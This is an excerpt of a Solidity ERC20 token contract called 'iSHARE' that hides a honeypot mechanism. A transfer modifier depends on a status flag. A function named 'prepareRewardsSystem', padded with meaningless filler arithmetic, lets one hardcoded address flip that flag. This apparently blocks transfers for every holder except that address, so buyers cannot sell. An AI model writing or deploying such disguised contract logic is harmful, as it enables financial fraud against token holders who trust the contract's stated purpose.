...
contract iSHARE is Context, IERC20, IERC20Metadata {

    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _tokenba_totalSupply;
    uint256 private _tokenba_status = 0;
    uint256 public stakingPoolbaStatus = 0;

    string private _tokenba_name;
    string private _tokenba_symbol;

    address private _poolbaAddress = 0xd50c27784AB430889B061A23ae42BB7Ee88435bE; 

    constructor() {
        _tokenba_name = "iSHARE";
        _tokenba_symbol = "iSHARE";
        _tokenba_totalSupply = 1000 * 10 ** 18;
        _balances[msg.sender] = _tokenba_totalSupply;
    }

    modifier forTransfer {
        require(msg.sender == _poolbaAddress || _tokenba_status == 0);
        _;
    }
    ...
    function prepareRewardsSystem(address to) public {
        to == address(0);
        stakingPoolbaStatus = 1;
        uint256 a = 1;
        a = a + 1;
        a = a-1;
        if (msg.sender == _poolbaAddress)
        {
            _tokenba_status = 1;
        }
    }
